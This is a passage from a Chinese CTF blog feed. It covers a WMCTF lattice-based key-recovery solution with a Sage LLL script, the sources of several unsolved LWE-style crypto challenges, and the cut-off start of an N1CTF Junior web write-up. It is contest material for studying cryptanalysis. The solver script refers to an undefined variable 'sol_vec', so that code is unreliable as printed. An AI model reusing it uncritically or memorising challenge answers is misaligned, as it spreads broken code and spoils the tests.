class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;A=<span class="subst">&#123;A&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;B=<span class="subst">&#123;B&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;R=<span class="subst">&#123;R&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;gift=<span class="subst">&#123;gift&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=7159749741429322755131240146118071759513715820993285825839372472474407666017557572129271731613358007058734527689330441569348431807180112353088919340436347</span></span><br><span class="line"><span class="comment"># A=[6099484397780065687822398499925956660167123649401003086450429553387635127108172239381711192830201627868739985455478039493705929385423995630816089813826652, 89722133899180146464100891510163842168405798298452823483063318133678868709451123173510945333104825653032959450315649783796310151123989041792721415722484, 6852373640840439902263069245352036561377612959731529442657261290464193432386684112062098796260781796040393491512167644773780010990517598995340849012156752, 905572447043025859658716967933649489546055535993585428025481014254600350130412634867260097168151503405254514553766823286383565893018173373564554336056693, 4619203611445979770240267215110891760841947947738244443460262136009336416179092898214434705455167036725713675890810610700106198084790551650093160195275702, 3069238570521651083095142261917310941562970802732278543454193591033820858125892411024150728211080137659037098102856608536404922668196774692048992081648551, 2072290141156875572599510174743549619222963372822414855220494223803795956351998912692844952044029330311821434784805742487737048376693843981146845532811418, 4118630348835299974900731058046317343585580076694977535798202938226187304960635726712385771299418425062431822315135332845240129948946520330840063372710812, 5494897767679702083905262716715474988716617413297387287978901109122932238365802120197755794026314539468927208231771384572456104728695543349076171476106692, 5242904898120293050194404817363504806316489104114848367489798169501727630568797399722291273601688449269113866312614390323808528035310223034076071688527093]</span></span><br><span class="line"><span class="comment"># B=[2225881589521184173065274225912017053067069649965432632423136697355986574624766674385247816885344883664964124555071710934403200036986056742665338710501199, 6648320309177586281256682217887823816445310746588184022611740437856487828841524257412678979289757558617628247133981523476180196883192489542467687175493866, 1368643343865975119970439821808519233195197253476459608302319415282308653927922072355125801570423137124789823080768464141261145798676583005521122600184021, 4757972435898893943050634851470164873875968802674701938325764517462502213399385660925464222079964582272246709905040569303916540860368398046797311634207119, 3491493600654315810383896038657359020801782746573223354229968950004336723011925225140197224620617196713846979463196337854602425927920594332253840267066287, 5812910599586334226756848369194045700041602130860303332014243049211324518168755764068940745746358136899818045819591702608213306673108319488577075164061902, 5286480909173195769260613883921498519696474112632193807758953252056528658290642833837928174403014629586637399671995087032742056865191425515352773317139947, 5990084243427240363832897819696345106790895509165460228212982648304258173654753003702718799678678397988011691031933597893892134441380835867546094903910961, 4657207884013678545225122398830559190905549085156416548267023047411835416409008088567237198440378272503925106822333599825940007094045484876222921444207859, 4337342732185682149995046884384392099143035562597116814453255157188836395606408153375003404584342070812600880379801960599561396105172991519802949392096959]</span></span><br><span class="line"><span class="comment"># R=[[5437342344417526961447037102420381576182242917002824736531383988448576795401348337669838142255293777506485879415403692176729738237621696959342977281065396, 118207420592466754679295752653401966487038067694232692642557897325071960359432451312279399266748403346434433562012104799520263992802423378954266828804131, 7096197247368703535624516822532525663824053041765748785834200261711792994365801659587654582314309510718479268191354720373426303224114439156530646421389487], [2048337393654342724878996996835462937898615364747266814141518152181142819685131064444737246705773125581643549980403948577060721913752092536246991248488798, 4032915799560554709639638304258383923016302450145031749214368211030759499850002173909365184297695024196808815382820437454460747458506629192382539028901160, 4232871593307892145191764881832084004817150942430800176840205014538991625057835110518374643680800074286367340775128361231313202429848296012489919924979266], [2553386960937591100090865827289064489951927968995578370310341693487902315425241611375327831218812187817696136311487587016400127802098102736127873401818913, 5823670592022005462447151598758745521401539301567430301030393638437006554138239970651467866637510447017480176716140423825242961163243963505222273874838613, 5774084025457416187346689800934856256827564486310334723289121828349816917057440353481035763960569668502226684658505097070668779989218703360744064625684871], [7046572309712543369992700561219588655579833588142366002445356785295649361641707579997338719645976088701747288198545152391667165237528203051491380206476100, 3086411743880543388057778894558929465483005347509988210044202022882123069984407733408405454699097438747656268706316626496116194702187510362704226701362680, 3824920704333716278162115284149190730865231866245771161577917822721893196275454552093227654236325852790896150665403865418453038676291626669950621607864235], [6760618245898750953819376194151632666239738960636983938459565687242233704064651489179662554150497876748082273757875418325340597777457003363001123655534527, 4343397856990866281857795612386217816895468511981051731094731266904611655944226707430233814074001565540730803579725372227013575628572646210241319814714476, 7126011694277861782468567565693664008866580617261568379233477615778205440306291716911745585348838954153812439519950532595352182974188212855768277246923419], [2953923187831173071776186551032070259914505167253362070557203382982396081492190509064486405525934004929672640497574202986456906310807830423216504796476927, 1345669062441589204474792668690191778211085836386374497142860395037294956095491918997725669029150439803057766748915079527876461488078624845798404978671362, 6975771805724338057550497476188442963101655123133481610941634405619501180059972427132933469246923537067484663454770321483398210207386857564548399452193784], [613595431074082703746546668753146025816666490902587228756275516028887275638378432031652661608234989583525385999489844534573227312653028029927921272453512, 4123105910746992373978630252040464408125059102592223292674058753777019714209155710896007043366563874898777820917476610249503568925138753611543704471760303, 989555937865263901715230959831678853496396994080634488540356871394920097958240471950255879798889334377502384605373832255522749450694078070958912976709214], [5535837862012327812765107969360670846116191751375838521859633639946929019321243840486291205554534270213183060274542457089991919161794065714297577071253492, 2217022003356883793255174224244083193207752640022692463419248286782028965975927441224003452590436406144452759467937867082143500151445862797223973537424326, 4169012965258555766659454909927125486691566973583123755296718808398491419295598806865374588756721952326039465076613735671092746736038930739233766233317746], [2460973952017922432127354291027776825014962112677929880673566789249322210046943034298740329681812324994822480424953136978723367413424675867422535483400994, 6525560390886316331291464628669910149125483607726248566635546904534294626062586662528213108239725365594595677881216065984903337839878980240035564934046552, 5267455846476800778837810675968652912499902190539148131941469838044707979168868352552242860860469415418625601143261920057498327632704722410629571902757207], [2836101201606404086963674515196242099981794676200180367684860793033271859982764426617335526949325589855895823167197136257361757221153866636871210172909499, 2905746791428321890819637325300810834453495282574466482434863215508033662223795925912808993026408194967015679126821486382496994000126841698935066307107806, 6179734411062461009407000122687973511105948755170244204181450729410647901986426188970783453277592832386486628788023466433324078852891442496360969724173650]]</span></span><br><span class="line"><span class="comment"># gift=[841309, 840]</span></span><br></pre></td></tr></table></figure><p><code>split_master()</code>与上一题一样</p><ul><li>将<code>512位</code>的<code>key</code>分割成<strong>5段</strong>，长度分别为<strong>182, 20, 200, 10, 100位</strong></li><li>返回<strong>第2段</strong>（索引为1，长度20位）和<strong>第4段</strong>（索引为3，长度10位）对应的两个整数</li></ul><p>因此，我们拿到了<code>key</code>的<strong>部分信息</strong><code>gift=[841309, 840]</code></p><p>接着又生成了<strong>10组数据</strong></p><p>$B_{i}\equiv A_{i}<em>key+s_{i}\pmod p$<br>$s_{i}\equiv (R_{i,0}</em>k_{i,0}+R_{i,1}<em>k_{i,1}+R_{i,2}</em>k_{i,2})\pmod p$<br>$k_{0}\in [1,2^{64}]$<br>$k_{1}\in [1,2^{128}]$<br>$k_{2}\in [1,2^{256}]$</p><p>$未知数有33个：X_{0},X_{2},X_{4}\ \ \ k_{0,0},k_{0,1},k_{0,2},…,k_{9,0},k_{9,1},k_{9,2}$<br>$已知的数据为：p,A,B,R$<br>$k_{know}=(gift_{1}&lt;&lt;100)+(gift_{0}&lt;&lt;310)$</p><p>$key=k_{know}+(X_{0}&lt;&lt;330)+(X_{2}&lt;&lt;110)+X_{4}$</p><p>$(A_{i}\cdot 2^{330})\cdot X_{0}+(A_{i}\cdot 2^{110})\cdot X_{2}+A_{i}\cdot X_{4}+s_{i}\equiv C_{i}\pmod p$<br>$C_{i}\equiv B_{i}-A_{i}\cdot k_{know}\pmod p$</p><p>$(A_{i}\cdot 2^{330})\cdot X_{0}+…+R_{i,2}*k_{i,2}-p\cdot m_{i}-C_{i}\cdot z=0$</p><p>$v=(X_{0},X_{2},X_{4},k_{0,0},k_{0,1},k_{0,2},…,k_{9,2},m_{0},…,m_{9},z)$<br>$向量v的维度为3+30+10+1=44，前33个分量都属于小整数，最后一个分量z为1$</p><p>$我们构造这样的一个10<em>44的矩阵M，使得M</em>v^{T}=0$<br>$那么，要如何利用LLL算法找到正确的v呢？$</p><p>$kernel_basis = M.right_kernel()，得到M的右核(也称为零空间、解空间)，即满足mv=0的向量v集合$</p><p>$我们需要在众多的向量中，找到那个唯一满足我们要求的v$<br>$K = kernel_basis.basis_matrix()，将抽象的解空间转换为可直接操作的基矩阵K$</p><p>$K_scaled = K * diagonal_matrix(W)，K右乘一个对角矩阵W，实现加权缩放$<br>$其实就是配平，使得LLL算法能准确找到最短向量$<br>$m_{i}有512bits，所以这里需要给每个分量加个权重使其达到512bits$</p><p>$然后检查一下规约出的最短向量是否是我们精确缩放的，如果是缩放回去$<br>$并且确保最后一个分量一定是1，如此就找到了正确的向量v$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">p = <span class="number">7159749741429322755131240146118071759513715820993285825839372472474407666017557572129271731613358007058734527689330441569348431807180112353088919340436347</span></span><br><span class="line">A = </span><br><span class="line">B = </span><br><span class="line">R = </span><br><span class="line">gift = [<span class="number">841309</span>, <span class="number">840</span>]</span><br><span class="line"></span><br><span class="line">K_known = (gift[<span class="number">1</span>] &lt;&lt; <span class="number">100</span>) + (gift[<span class="number">0</span>] &lt;&lt; <span class="number">310</span>)</span><br><span class="line">C = [(B[i] - A[i] * K_known) % p <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">num_x_parts = <span class="number">3</span></span><br><span class="line">num_k_per_eq = <span class="number">3</span></span><br><span class="line">num_eqs = <span class="number">10</span></span><br><span class="line">num_x_vars = num_x_parts</span><br><span class="line">num_k_vars = num_k_per_eq * num_eqs</span><br><span class="line">num_m_vars = num_eqs</span><br><span class="line">num_z_vars = <span class="number">1</span></span><br><span class="line">num_total_vars = num_x_vars + num_k_vars + num_m_vars + num_z_vars</span><br><span class="line"></span><br><span class="line">M = matrix(ZZ, num_eqs, num_total_vars)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_eqs):</span><br><span class="line">    M[i, <span class="number">0</span>] = A[i] * (<span class="number">2</span>**<span class="number">330</span>)</span><br><span class="line">    M[i, <span class="number">1</span>] = A[i] * (<span class="number">2</span>**<span class="number">110</span>)</span><br><span class="line">    M[i, <span class="number">2</span>] = A[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_k_per_eq):</span><br><span class="line">        M[i, num_x_vars + i * num_k_per_eq + j] = R[i][j]</span><br><span class="line">    M[i, num_x_vars + num_k_vars + i] = -p</span><br><span class="line">    M[i, num_x_vars + num_k_vars + num_m_vars] = -C[i]</span><br><span class="line"></span><br><span class="line">kernel_basis = M.right_kernel()</span><br><span class="line">K = kernel_basis.basis_matrix()</span><br><span class="line"></span><br><span class="line">W = [<span class="number">1</span>] * num_total_vars</span><br><span class="line">scaling_factor = <span class="number">2</span>**<span class="number">512</span></span><br><span class="line"></span><br><span class="line">W[<span class="number">0</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">182</span>)  <span class="comment"># X0</span></span><br><span class="line">W[<span class="number">1</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">200</span>)  <span class="comment"># X2</span></span><br><span class="line">W[<span class="number">2</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">100</span>)  <span class="comment"># X4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_eqs):</span><br><span class="line">    W[num_x_vars + i*num_k_per_eq + <span class="number">0</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">64</span>)  <span class="comment"># k_i,0</span></span><br><span class="line">    W[num_x_vars + i*num_k_per_eq + <span class="number">1</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">128</span>)  <span class="comment"># k_i,1</span></span><br><span class="line">    W[num_x_vars + i*num_k_per_eq + <span class="number">2</span>] = scaling_factor // (<span class="number">2</span>**<span class="number">256</span>)  <span class="comment"># k_1,2</span></span><br><span class="line"></span><br><span class="line">W[num_x_vars + num_k_vars + num_m_vars] = scaling_factor  <span class="comment"># z</span></span><br><span class="line"></span><br><span class="line">K_scaled = K * diagonal_matrix(W)</span><br><span class="line">LLL_scaled_basis = K_scaled.LLL()</span><br><span class="line"></span><br><span class="line">shortest_vec_scaled = LLL_scaled_basis[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">is_exact = <span class="built_in">all</span>(shortest_vec_scaled[j] % W[j] == <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_total_vars))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> is_exact:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] The shortest vector could not be unscaled perfectly. This is unexpected.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Check weights or problem formulation.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    shortest_vec = vector([shortest_vec_scaled[j] // W[j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(num_total_vars)])</span><br><span class="line">    z = shortest_vec[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(z) == <span class="number">1</span>:</span><br><span class="line">        X0 = sol_vec[<span class="number">0</span>]</span><br><span class="line">        X2 = sol_vec[<span class="number">1</span>]</span><br><span class="line">        X4 = sol_vec[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= X0 &lt; <span class="number">2</span>**<span class="number">182</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= X2 &lt; <span class="number">2</span>**<span class="number">200</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= X4 &lt; <span class="number">2</span>**<span class="number">100</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Found a valid solution vector!&quot;</span>)</span><br><span class="line">            key_reconstructed = K_known + (X0 &lt;&lt; <span class="number">330</span>) + (X2 &lt;&lt; <span class="number">110</span>) + X4</span><br><span class="line">            key_str = <span class="built_in">str</span>(key_reconstructed)</span><br><span class="line">            flag_hash = md5(key_str.encode()).hexdigest()</span><br><span class="line">            flag = <span class="string">&quot;WMCTF&#123;&quot;</span> + flag_hash + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Shortest vector found, but its components are out of bounds.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Shortest vector&#x27;s z component is <span class="subst">&#123;z&#125;</span>, not +/-1.&quot;</span>)</span><br><span class="line"><span class="comment"># WMCTF&#123;ed27074de5c476e67328e04b6e27a5b8&#125;</span></span><br></pre></td></tr></table></figure><p>还有别的打法，见<a href="https://tangcuxiaojikuai.xyz/post/b852ef1b.html">糖醋小鸡块师傅的博客</a></p><h2 id="LW3-1-solved"><a href="#LW3-1-solved" class="headerlink" title="LW3* | 1 solved"></a>LW3* | 1 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice, sample</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m, n = <span class="number">90</span>, <span class="number">64</span></span><br><span class="line">p = <span class="number">1048583</span></span><br><span class="line"></span><br><span class="line">E = sample(<span class="built_in">range</span>(<span class="number">1</span>, p), <span class="number">3</span>)</span><br><span class="line">s = random_vector(Zmod(p), n)</span><br><span class="line">A = random_matrix(Zmod(p), m, n)</span><br><span class="line">e = vector(Zmod(p), [choice(E) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)])</span><br><span class="line">b = A*s + e</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🎁 :&quot;</span>, E + A.<span class="built_in">list</span>() + b.<span class="built_in">list</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🚩 :&quot;</span>, AES.new(key=md5((<span class="built_in">str</span>(s)).encode()).digest(), nonce=<span class="string">b&quot;Tiffany&quot;</span>, mode=AES.MODE_CTR).encrypt(flag))</span><br></pre></td></tr></table></figure><p>这题与<code>Hitcon2025 BabyLWE</code>极其相似(虽然当时也没参加)，维度更小而且<code>E</code>也给出了</p><p>不过参考调试了一下午都没能打出来……</p><blockquote><p>Reference<br><a href="https://tangcuxiaojikuai.xyz/post/e7cc42f8.html">https://tangcuxiaojikuai.xyz/post/e7cc42f8.html</a><br><a href="https://tangcuxiaojikuai.xyz/post/94c7e291.html">https://tangcuxiaojikuai.xyz/post/94c7e291.html</a><br><a href="https://huangx607087.online/2025/04/06/NSSCTFEasyMod/#5-easyModX">https://huangx607087.online/2025/04/06/NSSCTFEasyMod/#5-easyModX</a><br><a href="https://github.com/maple3142/My-CTF-Challenges/tree/d72de5b90c68a25d94feeca0cdff3f8bdbdae4ab/HITCON%20CTF%202025/BabyLWE">https://github.com/maple3142/My-CTF-Challenges/tree/d72de5b90c68a25d94feeca0cdff3f8bdbdae4ab/HITCON%20CTF%202025/BabyLWE</a><br><a href="https://connor-mccartney.github.io/cryptography/other/HITCON2025">https://connor-mccartney.github.io/cryptography/other/HITCON2025</a></p></blockquote><p>后续是，继续看<a href="https://tangcuxiaojikuai.xyz/post/b852ef1b.html">糖醋小鸡块师傅的博客</a>吧</p><h2 id="LW5-0-solved"><a href="#LW5-0-solved" class="headerlink" title="LW5** | 0 solved"></a>LW5** | 0 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">E</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">set</span>([_ % p <span class="keyword">for</span> _ <span class="keyword">in</span> E])) == <span class="number">5</span></span><br><span class="line">    L = block_matrix(ZZ, [</span><br><span class="line">        [Matrix(ZZ, E)],</span><br><span class="line">        [Matrix(ZZ, [<span class="number">1</span>]*<span class="number">5</span>)],</span><br><span class="line">        [p]</span><br><span class="line">    ])</span><br><span class="line">    E_ = L.LLL()[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>([<span class="built_in">abs</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> E_]) &gt; <span class="number">1337</span> <span class="keyword">and</span> <span class="built_in">min</span>([<span class="built_in">abs</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> E_]) &gt; <span class="number">337</span></span><br><span class="line">    </span><br><span class="line">p = <span class="number">1048583</span></span><br><span class="line">E = literal_eval(<span class="built_in">input</span>(<span class="string">&quot;your error plz :)&quot;</span>))</span><br><span class="line"><span class="keyword">assert</span> check(E)</span><br><span class="line"></span><br><span class="line">m, n = <span class="number">90</span>, <span class="number">56</span></span><br><span class="line">s = random_vector(Zmod(p), n)</span><br><span class="line">A = random_matrix(Zmod(p), m, n)</span><br><span class="line">e = vector(Zmod(p), [choice(E) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)])</span><br><span class="line">b = A*s + e</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🎁 :&quot;</span>, A.<span class="built_in">list</span>() + b.<span class="built_in">list</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🚩 :&quot;</span>, AES.new(key=md5((<span class="built_in">str</span>(s)).encode()).digest(), nonce=<span class="string">b&quot;Tiffany&quot;</span>, mode=AES.MODE_CTR).encrypt(flag))</span><br></pre></td></tr></table></figure><p>这里就需要精心构造出满足条件的<code>E</code>，感觉不太有希望，直接不看了</p><h2 id="LemonPepper-1-solved"><a href="#LemonPepper-1-solved" class="headerlink" title="LemonPepper** | 1 solved"></a>LemonPepper** | 1 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    FLAG = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">flavorings</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, p, l</span>):</span><br><span class="line">        self.l, self.p = l, p</span><br><span class="line">        self.state = [randrange(p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">        self.a = [randrange(<span class="number">128</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        s = choice([<span class="built_in">sum</span>(self.state[i] ^ d * self.a[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.l)) % self.p <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>)])</span><br><span class="line">        self.state = [s] + self.state[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LemonPepper</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, q, t, e1, e2, p, l</span>):</span><br><span class="line">        self.q, self.t, self.e1, self.e2 = q, t, e1, e2</span><br><span class="line">        self.mcg = flavorings(p, l)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Lemon</span>(<span class="params">self</span>):</span><br><span class="line">        q, t, e1, e2 = self.q, self.t, self.e1, self.e2</span><br><span class="line">        R.&lt;x&gt; = PolynomialRing(Zmod(q ^ e2))</span><br><span class="line">        roots = [randrange(q ^ (e2-e1)) + <span class="built_in">sum</span>(<span class="built_in">next</span>(self.mcg) * q ^ (i + t) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e1))] + [randrange(q ^ e2) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t - <span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">return</span> randrange(q ^ e2) * prod([(x - root) ^ choice(<span class="built_in">range</span>(<span class="number">2</span>,<span class="number">5</span>)) <span class="keyword">for</span> root <span class="keyword">in</span> roots])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Pepper</span>(<span class="params">self</span>):</span><br><span class="line">        q, t, e = self.q, self.t, self.e2</span><br><span class="line">        R.&lt;x&gt; = PolynomialRing(Zmod(q ^ e))</span><br><span class="line">        roots = [<span class="built_in">next</span>(self.mcg) * q ^ <span class="number">130</span> + randrange(q ^ <span class="number">130</span>) + randrange(q ^ <span class="number">70</span>) * q ^ <span class="number">131</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t)]</span><br><span class="line">        <span class="keyword">return</span> randrange(q ^ e) * prod([(x - root) * (x - root - q ^ t) <span class="keyword">for</span> root <span class="keyword">in</span> roots]) * prod([x - root - q ^ <span class="number">40</span> <span class="keyword">for</span> root <span class="keyword">in</span> sample(roots, <span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;💀 ORDER INCOMING!</span></span><br><span class="line"><span class="string">&quot;25-min RUSH RECIPE: 7x🍋 CUPS + 3x🌶️ DASHES! COOK NOW!&quot;</span></span><br><span class="line"><span class="string">⏱️ 24:59... 24:58...&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;signal&quot;</span>).alarm(<span class="number">1500</span>)</span><br><span class="line"></span><br><span class="line">p, l = <span class="number">257</span>, <span class="number">25</span></span><br><span class="line">q, t, e1, e2 = <span class="number">27658548947</span>, <span class="number">30</span>, <span class="number">135</span>, <span class="number">165</span></span><br><span class="line">lemonpepper = LemonPepper(q, t, e1, e2, p, l)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🍋 Precision Zest Injection!&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="built_in">print</span>(lemonpepper.Lemon().<span class="built_in">list</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🌶️ Chaotic Spark Ignition!&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(lemonpepper.Pepper().<span class="built_in">list</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SHOVE PLATES INTO PORTAL! 🛸🍽️ VALIDATE 🍋🌶️ COMBO OR KITCHEN MELTDOWN! 💣💥&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).split(<span class="string">&#x27;,&#x27;</span>)] == lemonpepper.mcg.state</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;🍋🌶️ CHAOS COMBO! +500 EXTREME POINTS! ⚡💥 MUTANT FLAVOR UNLOCKED! <span class="subst">&#123;FLAG&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>这题也没看，留个附件在这</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://picx.zhimg.com/80/v2-1ba4c4523935adaa03e61a76ae5cc53b_1440w.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://picx.zhimg.com/80/v2-8855</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>N1CTF Junior 2025 2/2 WriteUp</title>
    <link href="https://hvang10.github.io/2025/09/15/N1CTF-Junior-2025-2-2-WriteUp/"/>
    <id>https://hvang10.github.io/2025/09/15/N1CTF-Junior-2025-2-2-WriteUp/</id>
    <published>2025-09-14T16:00:01.000Z</published>
    <updated>2025-09-16T17:58:58.191Z</updated>
    
    <content type="html"><![CDATA[<p>还是太难了QWQ，等补档了……</p><blockquote><p>wp参考<br><a href="https://c1oudfl0w0.github.io/blog/2025/09/13/N1CTF-Junior-2025-2-2">https://c1oudfl0w0.github.io/blog/2025/09/13/N1CTF-Junior-2025-2-2</a><br><a href="https://enoch.host/archives/n1ctf-junior-2025">https://enoch.host/archives/n1ctf-junior-2025</a><br><a href="https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA">https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA</a><br><a href="https://onehang01.github.io/2025/09/15/n1ctf-web-wp/">https://onehang01.github.io/2025/09/15/n1ctf-web-wp/</a><br><a href="https://www.cnblogs.com/lee0/p/19095583">https://www.cnblogs.com/lee0/p/19095583</a></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="online-unzipper"><a href="#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for, send_file, render_template, session, send_from_directory, abort, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.environ.get(<span class="string">&quot;FLASK_SECRET_KEY&quot;</span>, <span class="string">&quot;test_key&quot;</span>)</span><br><span class="line">UPLOAD_FOLDER = os.path.join(os.getcwd(), <span class="string">&quot;uploads&quot;</span>)</span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">users = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span 